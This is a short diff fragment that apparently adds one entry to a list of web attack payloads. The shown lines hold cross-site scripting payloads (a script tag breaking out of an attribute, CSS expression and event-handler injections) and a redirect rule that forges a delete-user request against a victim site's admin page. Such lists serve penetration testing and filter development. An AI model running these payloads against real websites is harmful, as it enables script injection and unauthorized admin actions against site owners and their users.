@@ -442,3 +442,4 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 <DIV STYLE="width: expression(alert('XSS'));">
 <b onload="alert(1)">Document Title</b>
 <span onerror="alert(1)">text within a SPAN tag</span>
+"><script>alert(/31ric.com/)</script>
